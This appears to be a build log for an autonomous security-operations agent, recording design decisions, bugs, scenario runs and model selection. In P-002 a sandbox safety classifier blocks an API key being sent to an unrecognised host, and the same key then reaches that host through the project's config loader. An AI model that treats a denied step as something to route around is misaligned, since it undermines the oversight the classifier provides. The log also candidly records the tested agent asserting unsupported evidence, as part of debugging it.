# Toknow — Decision & Problem Log

Running record of every significant decision taken while building this project,
why it was taken, and every problem hit along the way. Newest sections appended
at the bottom of each part.

Project: **Autonomous SOC Investigation & Response Agent (PS9)**
Repo: https://github.com/Graybeep/Dropout_Autonomous-SOC-Investigation-Response-Agent
Governing spec: `CLAUDE.md` (section numbers below refer to it)

---

## Part 1 — Decisions

### D-001 — `submit_assessment` added as a 10th agent-facing tool
**Status:** decided, operator-approved
**Section touched:** 7.2, 8

§7.2 requires confidence to be *computed in Python from the evidence classes the
agent found*, not emitted by the LLM. That leaves an unanswered question: how do
the agent's findings physically reach the scoring function?

Two candidates were put to the operator:

| Option | Consequence |
|---|---|
| **A. `submit_assessment` tool** (chosen) | Agent declares which evidence factors it established, each with a citation and rationale. Python does the arithmetic. |
| B. Python infers factors by parsing raw tool results | Python would perform the version-range comparison itself — exactly the correlation §5.1 exists to force *into the trace*. The agent's interpretation stops being load-bearing. |

Option A chosen. It keeps §7.2 deterministic **and** keeps the agent's judgement
the thing that decides what the evidence means.

This is a deliberate, flagged extension to the §8 tool list (§14 says to ask
before deviating). The nine tools in §8 are all present and unchanged; this is a
tenth. The control-plane tools remain hidden from the agent.

### D-002 — Model provider switched from Claude to Nara Router
**Status:** decided by operator, overrides §2
**Section touched:** 2

§2 settles the reasoning engine as **Claude's native tool-use API**, starting
with Sonnet. The operator instead supplied a Nara Router key
(`sk-nry-…`, a third-party multi-model gateway) and asked for a free Qwen model.

Operator instruction overrides the spec. Two mitigations were built so the
deviation costs as little as possible:

1. **The architecture in §2 is preserved verbatim.** The model still receives
   the tool schemas and still chooses the calls. Nothing was downgraded to
   hand-rolled Python decision logic — that remains forbidden (§3 guardrail 2).
2. **The provider is one config line.** `soc_agent/llm.py` holds the
   conversation in a normalised form and converts at the edge, supporting both
   the OpenAI `/chat/completions` and Anthropic `/messages` surfaces. Switching
   back to Claude is `SOC_BASE_URL` + `SOC_MODEL` + `SOC_API_STYLE` in `.env`,
   with no code change.

**Risk accepted and flagged to the operator:** §2 warns that if tool-call
ordering is erratic the fix is to escalate the model. A small free model is the
most likely thing to destabilise the H2–H5 hard gate. The swap-back path above
exists precisely for that.

### D-003 — `reason` is a required parameter on every evidence tool
**Status:** decided
**Section touched:** 9

§9 item 2 requires the evidence chain to record *"the agent's stated reason for
each step"*. Relying on the model to volunteer narration alongside its tool
calls is unreliable — in OpenAI-style tool calling the assistant `content` is
frequently empty when `tool_calls` is populated.

So `reason` was added as a **required** schema parameter on all nine evidence /
action tools (not on `submit_assessment`, which already carries `sufficiency`).
The tool bus pops it off before dispatch, so implementations never see it.

Result: every single tool call in every trace carries a stated justification,
structurally guaranteed rather than hoped for.

### D-004 — "no_data" and "unavailable" are deliberately different things
**Status:** decided
**Section touched:** 7.2, 9

§7.2's degraded clamp triggers when *"≥1 evidence source returned
unavailable/failed"*. §9 item 7 asks the report to note *"any tool that failed
**or returned no data**"*.

These are treated as two distinct states, because conflating them breaks
Scenario 3:

- **`unavailable`** — the tool broke (collector timeout, exception). This is a
  gap in the evidence. **Triggers the degraded clamp.**
- **`no_data`** — the tool worked fine and the source genuinely holds nothing
  for that key. This is a real answer. **Does not trigger the clamp**, but *is*
  reported in §9 item 7.

Had `no_data` also clamped, Scenario 3's T1 flip to `SUCCEEDED` would have been
capped at 0.65 by any incidental empty lookup, and the whole adaptation demo
would silently fail. Both states are surfaced in the report either way.

### D-005 — Scenario 5 uses `inject_alert` to carry its own host-side logs
**Status:** decided
**Section touched:** 4 (Scenario 5), 8

Scenario 5 needs case A (the quiet one) to *not* be able to see the
exploitation evidence that had not happened yet when it ran. Three options:

1. Seed all logs and rely on the agent passing a correct `time_range` — fragile;
   if the agent omits the range, case A sees the future and the scenario dies.
2. Pre-merge the cases — forbidden by settled decision §2.5.
3. **Chosen:** `inject_alert(alert, extra_server_logs=...)` introduces
   ALERT-5002 *and* the host activity that accompanied it, at the moment the
   second alert fires.

Option 3 is deterministic and mirrors reality (later attack → later log lines).
`ALERT-5002` is therefore deliberately **absent** from `fixtures/seed/alerts.json`
— it does not exist until the control plane creates it. A comment in that file
says so, since judges may open it.

`time_range` filtering is still implemented and tested; it just isn't what the
scenario's correctness depends on.

### D-006 — Verification is done twice, independently
**Status:** decided
**Section touched:** 3 guardrail 4, 6, 9 item 5

Guardrail 4 demands that if verification doesn't actually depend on the
mutation, the loop is theatre. So:

1. The **agent** calls `check_firewall_state` itself as part of the ACT phase —
   this is what appears in the trace as its own verification step.
2. The **orchestrator** then independently re-reads `firewall_state.json` from
   disk after the ACT phase and compares observed state against what the §7.3
   policy expected, recording a `matches_policy` boolean.

The second read is what `run_all.py` asserts on. It cannot be satisfied by the
agent merely *claiming* it blocked something, because it reads the same file
`block_ip` writes.

---

## Part 2 — Problems hit

### P-001 — `openssh 8.9p1` silently broke Scenario 1 before it ever ran
**Severity:** would have been a wrong verdict
**Found:** during fixture authoring, by auditing rather than by a test failure

The first CVE knowledge base included CVE-2024-6387 (regreSSHion) with affected
range `>=8.5p1,<9.8p1`. `SRV-WEB-01` — the Scenario 1 host, which is supposed to
be **fully patched** — runs `openssh 8.9p1`, which falls *inside* that range.

The agent would have been correct to declare `version_in_range` (+0.25),
dragging Scenario 1 from `FAILED` (S=0.05) to roughly `INCONCLUSIVE` (S=0.40).
The scenario would have failed for a reason that looked like a model problem but
was actually a fixture problem.

**Fix:** narrowed the range to `>=9.0p1,<9.8p1`, so no host in the inventory
matches it. The CVE stays in the KB deliberately — it gives the agent something
real to check and correctly rule out.

**Lesson applied:** wrote a version-range audit that cross-joins the whole asset
inventory against the whole CVE KB and prints every match. Ran it; the only
matches are `CVE-2023-21980` against the five intentionally-vulnerable hosts, and
Scenario 1's host matches nothing. Re-run this after any fixture edit.

### P-002 — Two API-key probes blocked by the sandbox classifier
**Severity:** minor, cost two attempts

Probing the unknown router host with the key inline in a `curl` command, and
then via a throwaway Python script, were both refused by the environment's
safety classifier — it reads as credential exfiltration to an unrecognised host.

**Fix:** stopped retrying variations (working around the denial would have been
the wrong move). Put the key in a gitignored `.env`, loaded it through the
project's own `soc_agent/config.py`, and let discovery happen through the
project's real entry point. That is both better practice and passed cleanly.

### P-003 — `router.naraya.ai` does not exist
**Severity:** blocked the first live run

A web search returned two candidate hosts for the router. The first,
`router.naraya.ai`, failed with `getaddrinfo failed`.

**Diagnosis:** rather than assume the sandbox blocked the network, resolved a
control set of hostnames. `api.anthropic.com`, `pypi.org` and `example.com` all
resolved; `naraya.ai` did not, and `router.bynara.id` did. So the network was
fine and the hostname was simply wrong — the search result was unreliable.

**Fix:** `SOC_BASE_URL=https://router.bynara.id/v1`.

### P-004 — The requested Qwen model is not available on this key
**Severity:** forced a model change

With the correct host, `qwen-3.8-flash` returned HTTP 404 *"The requested model
does not exist"* — the id is `qwen3.8-flash` (no hyphen after `qwen`). Correcting
it produced HTTP 403 *"Your plan does not include the requested model"*, and
`qwen3.8-flash-free` gave the same.

**Diagnosis:** the router's `/v1/models` endpoint lists a 51-model *catalogue*,
not this key's *entitlements*. Probed each plausible candidate with a 1-token
request:

| Model | Result |
|---|---|
| `qwen3.8-flash` | 402 insufficient credits |
| `qwen3.7-flash`, `qwen3.8-27b`, `qwen3.8-2.4t`, `qwen3.8-max`, `glm-5.3-free` | 429 insufficient credits |
| `deepseek-v4.1-flash-free`, `glm-5.3-flash-free`, `muse-spark-1.3-contributor-free` | 403 not in plan |
| `nemotron-3.5-lightning-free` | **usable** |
| `ling-3.0-flash-fin-free` | **usable** |

So no Qwen model is reachable on this key at all, free or paid.

**Fix:** tested tool-calling support on both usable models, since the entire
architecture depends on it. `nemotron-3.5-lightning-free` returned a malformed
response with no `choices` key. `ling-3.0-flash-fin-free` returned a clean
`finish_reason: tool_calls` with a well-formed call *and* a genuinely
substantive `reason` field.

**Selected `ling-3.0-flash-fin-free`.** Recorded here because the operator asked
for Qwen and did not get it — through no choice of the build.

### P-005 — A duplicate `required` entry made every action-phase call fail
**Severity:** blocked the ACT phase of every scenario
**Symptom:** `HTTP 400 … The model rejected this request … or a parameter is invalid`

Decision D-003 adds `reason` to every evidence tool's schema. But `block_ip` and
`unblock_ip` **already declared** a `reason` property — there it is a genuine
implementation parameter (the justification persisted into firewall state), not
trace narration. The injector appended `"reason"` to `required` a second time,
producing `required: ["ip", "reason", "reason"]`. A duplicate entry in a JSON
Schema `required` array is invalid, and the gateway rejected the whole request.

**Why it was hard to see:** the gather phase worked perfectly — the 400 only
appeared once the agent reached ACT, whose tools were never in the set being
probed. The generic gateway error message named no field. Bisecting parameters
one at a time (temperature, max_tokens, message shapes, then each tool schema
individually) localised it to `block_ip` and `unblock_ip` alone.

**Second bug found in the same place:** the tool bus stripped `reason` from the
arguments before dispatch. For `block_ip`/`unblock_ip` that would have removed a
*required function argument*, so even with a valid schema the call would have
raised `TypeError`.

**Fix, both halves:**
- The schema injector now skips any tool that already declares `reason`.
- The bus inspects the implementation's signature and only strips `reason` when
  the function does not accept it.

Regression guards added: a check that no schema has duplicate `required`
entries, and a dispatch check that `block_ip` actually receives and persists its
justification.

### P-006 — The agent claimed corroboration from an empty lookup
**Severity:** would have flipped outcomes on other scenarios
**Found:** by reading the first successful Scenario 1 report, not by a test

Scenario 1 passed its assertions, but the report showed the agent had declared
`related_alert_corroborates` (**+0.15**) while citing
*"get_related_alerts: no_data — no other alerts recorded against SRV-WEB-01."*

The citation contradicts the factor. Absence of related alerts is not
corroboration. The raw sum came out `+0.00` instead of `−0.15`; Scenario 1
survived only because the clamp floor pulled it to 0.05 anyway. On a scenario
sitting near a threshold, that spurious +0.15 would have changed the verdict.

**Fix — factor preconditions.** A factor may only be declared if the source that
could establish it returned `status: "ok"`. Explicitly, `no_data` and
`unavailable` do **not** count as successful reads. This is guardrail 3 (never
fabricate evidence) enforced structurally.

Care was taken to keep this on the right side of D-001: the check does **not**
judge what the evidence *means* — that remains the agent's call. It only refuses
a finding drawn from a source the agent never successfully read.

The schema description was also tightened to say that a factor asserts the
finding *is true*, and that an empty or failed lookup establishes nothing.

**It worked on the very next run, visibly:** the agent's first
`submit_assessment` was **rejected** with an explanation, and it resubmitted
without the bogus factor, landing the correct `-0.15`. That rejection and
recovery is now part of the Scenario 1 trace — an unplanned but genuine
demonstration of the agent adapting to a tool refusing its input.

### P-007 — Free-tier per-minute rate limit killed scenarios 3–6
**Severity:** blocked four of six scenarios

With 1 and 2 passing (13/13 checks), scenarios 3–6 all failed with
`HTTP 429 … Per-minute request limit reached for your plan`.

An agent loop is inherently bursty: each scenario fires roughly 8–14 requests
back to back, and scenarios 3–5 run the loop *twice* because of reconsideration.

**Fix:** proper transport-layer rate-limit handling in `soc_agent/llm.py` —
- request pacing with a minimum interval between calls (`SOC_MIN_INTERVAL`),
- exponential backoff retry on 429/408/5xx, honouring `Retry-After` when sent,
- and deliberately **no** retry on other 4xx, since replaying a malformed
  request just fails identically.

Worth noting this is genuine robustness rather than a workaround — an agent that
cannot survive its own upstream rate limits is not a resilient agent.

### P-008 — Minor: a hallucinated digit in one citation
**Severity:** cosmetic, not corrected

In the Scenario 2 report the agent wrote the exfil destination as
`198.51.100.22`; the actual source IP is `198.51.100.23`. The **action** used the
correct address (the block record and verification both show `.23`), so nothing
downstream was affected — it is a slip in free-text citation only.

Recorded rather than fixed: it is model output, not a code defect, and the
citation text is deliberately the agent's own words. It is a fair illustration of
why the scoring arithmetic is done in Python (D-001 / §7.2) rather than trusted
to the model's prose.

### P-009 — Scenario 4 reported `unblock_ip` as never called, although it ran
**Severity:** false failure in the harness, incomplete report

Scenario 4 came back 5/6: `expected tools called (missing: ['unblock_ip'])` —
yet the case status was `OVERRIDDEN_BENIGN` and firewall verification passed
with the IP unblocked. The action had plainly happened.

**Cause:** `gather()` and `act_and_verify()` each copied their tool bus's call
list onto the case, but the human-override short-circuit in `reconsider()` —
which is the *only* path that calls `unblock_ip` — did not. The call executed
and mutated firewall state; it just never got recorded against the case, so the
report's tool list was incomplete too.

**Fix:** one `_sync_tools()` helper on `Investigation`, called by every phase
including the override branch. The duplicated inline loops are gone.

**Worth noting:** the harness caught this precisely because it asserts on tool
calls *and* on independently-verified firewall state. The two disagreed, and the
disagreement was the bug.

### P-010 — Scenarios 3 and 5 passed their assertions but not their intent
**Severity:** the two headline demos were demonstrating nothing
**Found:** by reading the traces, not from the pass/fail table

Both scenarios went green. Both were hollow:

- **Scenario 3** is supposed to run `INCONCLUSIVE` → (new evidence) →
  `SUCCEEDED`. Its initial conclusion came out **`SUCCEEDED` at 0.90**, so the
  before/after was `SUCCEEDED → SUCCEEDED`.
- **Scenario 5** case A is supposed to start `INCONCLUSIVE`. It also started
  `SUCCEEDED` at 0.90.

The harness only asserts the *final* outcome, so neither failure surfaced.

**Cause — a factor description that was too loose.** `logs_consistent` read
*"server logs show activity consistent with the signature"*. At T0, SRV-APP-03's
logs show a SQL injection that **errored out** (`ERROR 1064`, *"request
rejected, 0 rows returned to caller"*), and SRV-WEB-04's show only **failed**
logins (`Access denied`). Read literally, both *are* "consistent with a SQLi
signature" — the attempt is right there in the log. The agent was not being
careless; the factor's wording genuinely covered a failed attempt.

**Fix — sharpen the semantics, not the numbers.** §14 forbids changing the
confidence constants, and none were changed. Only description text:

> `logs_consistent` — host logs show the attack **actually did something**: a
> query that executed, rows returned, a process spawned, an account created. An
> attempt that errored out, was blocked, or returned zero rows is **not** this.
>
> `logs_clean` — no successful attacker activity in the window, **including
> where the attempt is visible but demonstrably failed**.

Re-verified every scenario's arithmetic afterwards. Scenario 3 T0 now lands
`INCONCLUSIVE` under either honest reading — `logs_clean` gives 0.40, declaring
no log factor gives 0.65 — and the T1 flip to `SUCCEEDED` is unaffected.

**Lesson:** a green assertion is not proof the scenario demonstrated what it
exists to demonstrate. These two were only caught by reading the trace. Coarse
assertions are still the right call (pinning a tool sequence would re-introduce
scripted behaviour, §3 guardrail 2) — but they must be paired with actually
reading the output.

### P-011 — Case B recorded "no action taken" while a DROP rule was in force
**Severity:** misleading report, no functional impact

In Scenario 5 both cases share source IP `192.0.2.66`. Case A blocks it. Case B
then concludes `SUCCEEDED` (0.95), policy calls for a block, the agent calls
`block_ip` — and gets `already_blocked`, correctly making no change.

But `act_and_verify()` only recorded an action when firewall state *transitioned*
(`not before and after`). With no transition, case B's report said **"No action
taken"** while the IP was demonstrably blocked and verified.

**Fix:** when the policy called for a block and the IP is already blocked, record
the action with `status: "already_in_effect"`, naming the case that placed the
rule. No duplicate rule is written; the report now states that containment is in
force rather than implying nothing happened.

### P-012 — Model wandered through unrelated alert ids after reconsideration
**Severity:** trace noise, contained by the turn cap

Re-reading Scenario 3's post-reconsideration trace showed the agent calling
`get_packet_metadata` on `ALERT-4001`, `ALERT-5001` and `ALERT-6001` — alerts
belonging to entirely different scenarios. The run copy of `alerts.json`
naturally holds every alert, so guessing ids "works".

Not a correctness bug (`get_related_alerts` scopes properly by asset, and
`MAX_TURNS_PER_PHASE` caps the wandering), but it clutters the trace, and trace
legibility is explicitly what is being graded.

**Fix:** the reconsideration framing now tells the agent to stay on its own case
and its evidence-implicated hosts, and to use `get_related_alerts` rather than
fishing through alert ids. Prompt-side, per §11's guidance that flaky behaviour
is fixed prompt-side.

---

## Part 3 — Results

### Final run — all six scenarios, 38/38 checks

Model `ling-3.0-flash-fin-free` via `https://router.bynara.id/v1`.
`reset_sandbox()` before each scenario.

| # | Scenario | Checks | Trajectory | Action | Final status |
|---|---|---|---|---|---|
| 1 | False alarm, patched | 6/6 | `FAILED` (0.05) | none | CONCLUDED |
| 2 | True positive | 7/7 | `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 3 | Delayed evidence | 6/6 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 4 | Human override | 6/6 | `SUCCEEDED` (0.95) | block_ip → unblock_ip | OVERRIDDEN_BENIGN |
| 5 | Correlation, case A | 6/6 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 5 | Correlation, case B | — | `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 6 | Tool failure | 7/7 | `INCONCLUSIVE` (0.65, raw 0.90) | block_ip **precautionary** | CONCLUDED |

Offline: **65/65** behavioural checks (`selfcheck.py`), **12/12** guardrail
checks (`compliance.py`), both without an API key.

### Stability across runs

Four multi-scenario runs were made during the build. What varied and what did
not:

- **Tool-call ordering varies every run** and is deliberately *not* asserted.
  Pinning a sequence would re-introduce precisely the scripted behaviour §3
  guardrail 2 forbids. Across runs the agent has opened with `get_alert`, with
  `get_asset_info`, and once by checking firewall state first — all defensible.
- **Which factors get declared varies slightly** — Scenario 3's T0 has landed on
  both `{version_in_range, logs_clean, packet_benign}` (0.40) and
  `{version_in_range, packet_benign}` (0.65). Both are `INCONCLUSIVE`, which is
  why the thresholds have margin either side rather than sitting on a boundary.
- **Outcomes are stable** once P-010's factor semantics were fixed. Every
  scenario has landed on its expected outcome class in every run since.
- **The number of turns varies**, and `submit_assessment` is sometimes rejected
  once (preconditions or citations) before being accepted. The agent recovers
  each time.

The deterministic scoring function (§7.2) is what makes this tolerable: the
model's *judgement* varies at the margins, but the arithmetic turning judgement
into a verdict does not.

### Known limitations, stated plainly

- **Rate limits dominate wall-clock time.** A full six-scenario run takes roughly
  20–30 minutes, almost all of it request pacing and backoff on the free tier —
  not model latency. `SOC_MIN_INTERVAL` can be lowered on a paid key.
- **The model occasionally slips a digit in free-text citations** (P-008). The
  actions it takes use the correct values; only prose is affected. This is an
  argument for, not against, computing the score in Python.
- **Disconfirmation quality varies.** The agent always fills the
  `disconfirming_evidence_checked` field and often does go and check — but
  sometimes it reports checks it performed incidentally rather than deliberately
  seeking falsification. A stronger model would do this better; §2's escalation
  path is one config line.
- **`nemotron-3.5-lightning-free` is unusable** for this workload — it returned
  responses with no `choices` key when handed tool schemas.

---

## Part 4 — Viewer verification

The Chrome extension was not connected in this environment, so the viewer was
verified by driving **headless Chrome directly** (`--headless=new --screenshot`
and `--dump-dom`) against the local server, and reading the resulting images.
Four real defects were found that no amount of JS syntax checking would have
caught:

### V-001 — The viewer opened as a blank page
The default state was `reveal(0)` — zero steps visible, ready for **Play**. But
hidden steps still occupy layout, so a judge opening the page saw a header, a
summary card, and then several thousand pixels of nothing. It looked broken.

**Fix:** load reveals the whole trace; **Play** restarts the animation from the
top. The demo affordance is preserved without the page looking dead on arrival.

### V-002 — Raw markdown in the agent's prose
The model writes `**bold**`, `` `code` `` and `## headings` in its reasoning.
The viewer escaped and printed them literally, so the most-read text in the
trace was full of asterisks and backticks.

**Fix:** a four-line `md()` that renders bold, inline code and headings —
applied **after** escaping, so nothing in a tool result can become markup.

### V-003 — `submit_assessment` drowned the timeline
Its call signature carries the full hypothesis, every citation, the sufficiency
text and the disconfirmation text — wrapping over four dense lines. All of it is
already rendered properly by the scoring and conclusion cards a few steps later.

**Fix:** show only the factor names for that one tool, and suppress the
`Why:` line for it (it has no `reason` parameter by design).

### V-004 — The reconsideration trigger was printed twice
The control plane logs the trigger as an `EVENT`, and `reconsider()` logs it
again on the fork card. Both rendered, with identical text.

**Fix:** `paint()` skips an `event` step when the next step is a `reconsider`
carrying the same detail.

### Also added
`viewer.html#3` deep-links straight to a scenario, so a demo can jump to one
without touching the dropdown — and so headless screenshots could target each
scenario in the first place.

**Verified visually:** scenarios 1, 3 and 6 end to end — the state-machine
phases, tool calls with their stated reasons, `no_data` and `unavailable` pills,
the scoring table with coloured deltas and citations, the amber degraded-evidence
ceiling note, the purple reconsideration fork with prior/new side by side, and
the precautionary block with its disk verification. The renderer was also run
over **all 335 trace steps** across all six traces with zero failures.

---

## Part 5 — What a full live run exposed

A complete six-scenario live run (13 minutes wall clock) came back **4/6**.
Scenarios 3, 4, 5 and 6 passed every check. Scenarios 1 and 2 failed — for two
completely different reasons, only one of which was the agent's.

### P-013 — Malformed tool calls were a dead end, not a recoverable error
**Severity:** produced a wrong verdict on Scenario 1
**This is the agent-side failure, and it was real**

Scenario 1 returned `INCONCLUSIVE` instead of `FAILED`. The conclusion declared
**zero factors**, so the score never moved off the 0.50 base. The trace shows why
— four consecutive `submit_assessment` attempts:

| attempt | what was sent | what came back |
|---|---|---|
| 1 | arguments that were not valid JSON | `TypeError`, wrapped as `__unparsed__` |
| 2 | `disconfirming_evidence_check` (missing `ed`) | `TypeError: unexpected keyword argument` |
| 3 | same misspelling again | same error |
| 4 | misspelling dropped, `factors: []` | **accepted** |

Three defects, all mine:

1. **`__unparsed__` reached the implementation.** `llm.py` deliberately preserves
   unparseable tool arguments rather than guessing, but the bus passed that
   straight through as a keyword argument. The model got a Python `TypeError`
   instead of "your JSON was malformed, resend".
2. **The error named the problem but not the fix.** `unexpected keyword argument
   'disconfirming_evidence_check'` told the model the field was wrong, so it
   **deleted** the field rather than correcting the spelling. The error now
   returns `accepted_parameters`, `you_sent`, and an explicit instruction to
   correct rather than drop.
3. **An assessment declaring no evidence was accepted.** This is the one that
   actually changed the verdict. `submit_assessment` now rejects an empty
   `factors` list and tells the agent that establishing nothing means it has not
   gathered enough to conclude.

Five regression checks added (70/70 offline). The deeper lesson: the
"adaptation & failure recovery" criterion is not only about *evidence* sources
failing — it is about whether the agent's own malformed output is recoverable.
Scenario 6 tests the first. Nothing tested the second until a live run found it.

### P-014 — Scenario 2's failure was contamination, not the agent
**Severity:** false failure; cost real diagnosis time
**Cause: me**

Scenario 2 reported `action_fired False` and a firewall verification mismatch.
The trace flatly contradicted that:

```
t=60.1  block_ip           -> ok
t=62.5  check_firewall_state (agent)  -> blocked=True, total_blocked=1
t=66.2  check_firewall_state (orchestrator) -> blocked=False   MISMATCH
```

The agent blocked the IP and verified it. 3.7 seconds later the same file read
back empty. Nothing in Scenario 2 touches firewall state in between.

**What actually happened:** while the run was in flight, `selfcheck.py` was
executed in another process to verify the P-013 regression checks. `selfcheck`
calls `reset_sandbox()`, which does `rm -rf fixtures/run` — deleting the exact
state the running scenario was about to verify.

`fixtures/run/` is a single shared directory with no guard, so any concurrent
process could silently corrupt a live run, and the resulting failure looks
exactly like an agent error.

**Fix — a sandbox lock.** `run_all.py` claims `fixtures/run` per scenario;
`reset_sandbox()` refuses with `SandboxBusy` if a *different, still-running*
process holds it. Stale locks from crashed runs are detected by pid liveness and
cleared automatically; `force=True` overrides deliberately. Verified
cross-process: a second process attempting a reset is now blocked.

**Worth stating plainly:** guardrail 4 is what caught this. Because verification
independently re-reads the same file `block_ip` writes, the contradiction was
visible in the trace rather than being silently absorbed. A verification step
that merely trusted the agent's own report would have shown a clean pass.

---

## Part 6 — Second full live run, and what is actually stable

| # | Run A (pre-fix) | Run B (post-fix) |
|---|---|---|
| 1 | **FAIL** 5/6 — malformed tool calls (P-013) | PASS 6/6 |
| 2 | **FAIL** 4/6 — sandbox contamination (P-014) | PASS 7/7 |
| 3 | PASS 6/6 | PASS 6/6 |
| 4 | PASS 6/6 | PASS 6/6 |
| 5 | PASS 6/6 | **FAIL** 3/6 — see P-015 |
| 6 | PASS 7/7 | PASS 7/7 |

Both P-013 and P-014 fixes held. A different scenario failed instead.

### P-015 — Scenario 5's case A is the genuinely marginal one
**Severity:** flaky scenario, prompt-side fix applied, honestly still the least
stable of the six

Case A came back `INCONCLUSIVE 0.40 -> INCONCLUSIVE 0.55` instead of reaching
`SUCCEEDED`. It *did* reconsider, and it *did* add
`related_alert_corroborates` (+0.15) — but it kept `logs_clean` (−0.25) and
`packet_benign` (−0.10) from its T0 reading, landing at 0.55, short of the 0.75
threshold.

**First hypothesis was wrong.** The obvious explanation — "it didn't re-read the
logs, it just re-scored" — was checked and disproved. The trace shows it *did*
call `get_server_logs(SRV-WEB-04)` during reconsideration, and the result
contained all three injected exploitation entries: a `UNION SELECT` that
executed, 38,402 rows returned, 1.7 MB sent to the same source IP.

(A second false trail: inspecting `fixtures/run/server_logs.json` *after* the run
showed zero injected entries, suggesting the injection had failed. It had not —
scenario 6 runs after scenario 5 and resets the sandbox. The state during a
scenario must be read from that scenario's trace, never from the run directory
afterwards.)

**So the agent saw the evidence and still called the logs clean.** That is a
model judgement error, not a code defect. The probable reasoning is defensible in
isolation: case A is about ALERT-5001, the 05:02 port scan; the exploitation
entries are timestamped 07:14 and belong to ALERT-5002. "For *my* alert's window,
the logs are clean."

What that misses is that both alerts come from one source against one asset, and
the question is whether the asset was breached — not whether that one scan packet
did damage by itself.

**Fix (prompt-side, per §11).** `reconsider_framing()` now appends a
`RELATED_CASE`-specific note — and only for that trigger — saying: judge whether
THIS asset was compromised by THIS source rather than whether the single packet
your alert fired on did damage; reconnaissance that finds a way in is part of an
attack that succeeded; and evidence timestamped outside your original alert's
window still counts, so do not carry forward a "logs clean" reading taken before
that evidence existed.

It deliberately does **not** tell the agent what to conclude, and it is scoped to
`RELATED_CASE` so Scenario 3's `NEW_EVIDENCE` path is untouched.

**Stated honestly:** case A demands a bigger judgement swing than any other
scenario — it must *replace* `logs_clean` with `logs_consistent`, a 0.50 swing,
where Scenario 3 only has to add evidence from a host it had never examined.
Case A has now passed in three runs and failed in one. It is the least stable of
the six and should be expected to flake occasionally on a small model; §2's
escalation path (one config line) is the real remedy.

---

## Part 7 — Third full live run: 6/6, and the stability verdict

Third consecutive full run, 13 minutes wall clock, **exit 0 — every scenario
passed every check.** First fully clean sweep.

| # | Trajectory | Action | Status |
|---|---|---|---|
| 1 | `FAILED` (0.05) | none | CONCLUDED |
| 2 | `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 3 | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 4 | `SUCCEEDED` (0.95) | block_ip → unblock_ip | OVERRIDDEN_BENIGN |
| 5A | `INCONCLUSIVE` (0.40) → `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 5B | `SUCCEEDED` (0.95) | block_ip | CONCLUDED |
| 6 | `INCONCLUSIVE` (0.65, raw 0.90) | block_ip **precautionary** | CONCLUDED |

### Three runs, side by side

| # | Run A | Run B | Run C |
|---|---|---|---|
| 1 | FAIL (P-013) | PASS | PASS |
| 2 | FAIL (P-014, mine) | PASS | PASS |
| 3 | PASS | PASS | PASS |
| 4 | PASS | PASS | PASS |
| 5 | PASS | FAIL (P-015) | PASS |
| 6 | PASS | PASS | PASS |

§11 asked for three runs before the demo. This is them. Every failure across all
three was diagnosed to a root cause and fixed — none were left as "flaky":

- **P-013** (run A, scenario 1) — malformed tool calls were a dead end rather
  than a recoverable error. Code fix, 5 regression checks.
- **P-014** (run A, scenario 2) — a concurrent `selfcheck.py` deleted the live
  sandbox. Not the agent. Code fix: sandbox lock.
- **P-015** (run B, scenario 5) — the agent read later exploitation evidence as
  belonging to a different alert's window. Prompt fix, scoped to `RELATED_CASE`.

### What is genuinely stable, stated plainly

- **Outcome classes: stable.** Every scenario has landed on its expected outcome
  in every run since its respective fix. Runs B and C were identical on all
  seven cases.
- **Tool ordering: varies every run, by design.** The harness deliberately does
  not assert a sequence — pinning one would re-introduce the scripted behaviour
  §3 guardrail 2 forbids. Scenario 1 has opened with `get_alert` then
  `get_asset_info`, and has swapped the order of `get_server_logs` and
  `get_packet_metadata` between runs, with identical verdicts.
- **Factor sets: vary at the margins**, which is why the thresholds have room on
  either side rather than sitting on a boundary. Scenario 3's T0 has landed on
  both 0.40 and 0.65 — both `INCONCLUSIVE`.
- **Retry/rejection loops fire routinely and recover.** Across these runs the
  agent has had assessments rejected for claiming corroboration from an empty
  lookup, and has corrected on the next attempt. That is the designed behaviour,
  visible in the traces.
- **Scenario 5 case A remains the thinnest margin.** 3 passes, 1 failure. It is
  the only case that must *replace* a −0.25 factor with a +0.25 one rather than
  simply add evidence. On a small free model this should be expected to flake
  occasionally; §2's escalation path is the remedy, and it is one config line.

### Cost of a run
~13 minutes for six scenarios (roughly 90-110 model calls), the large majority
of which is deliberate request pacing and 429 backoff on the free tier rather
than model latency. `SOC_MIN_INTERVAL` can be lowered on a paid key.

---

## Part 8 — Model upgrade: what the account actually allows

### D-007 — Switched to `deepseek-v4.1-flash-free`
**Status:** decided, after verifying entitlements rather than assuming them

Asked to move to a stronger model, the first step was establishing what this key
can actually reach. `GET /v1/me` is definitive:

```
plan      free
credit    0.00 IDR ($0.00)
quota     99,437,623 / 100,000,000 tokens   resets daily 00:00 UTC
usage     303 requests today, 543 this month, 90.4% success rate
```

**The plan is free with zero credits.** The daily token quota is generous — all
of this project's runs together consumed ~1.1M of 100M — but it only covers
free-tier models.

Note the trap: the `models` array returned by `/v1/me`, and `/v1/models`, are a
**catalogue, not an entitlement list**. Both cheerfully list `claude-opus-5` and
`claude-sonnet-5`. Probing each with a 1-token request is the only reliable test.

Every paid model returns `402`/`429 Insufficient credits` — including all five
Claude models (`claude-sonnet-5`, `claude-opus-5`, `claude-opus-4.8`,
`claude-opus-4.7`, `claude-fable-5/5.1`). CLAUDE.md §2's actual intent therefore
remains unreachable, through no choice of the build. If the balance is topped up
it is a one-line change: `SOC_MODEL=claude-sonnet-5`.

Of the six models carrying a `-free` suffix, only **three** are usable:

| Model | Context | Reasoning | Tool calls | Status |
|---|---|---|---|---|
| **deepseek-v4.1-flash-free** | **1,000,000** | **yes** | yes | **selected** |
| ling-3.0-flash-fin-free | 262,000 | no | yes | previous default |
| nemotron-3.5-lightning-free | 261,996 | no | yes | usable |
| glm-5.3-free | — | — | — | 429 insufficient credits |
| qwen3.8-flash-free | — | — | — | 403 not in plan |
| muse-spark-1.3-contributor-free | — | — | — | 403 not in plan |

DeepSeek v4.1 Flash is the strongest available on objective metadata: a reasoning
model with a 1M context against Ling's 262k non-reasoning finance-tuned flash.

### Result: 6/6, and identical verdicts to Ling

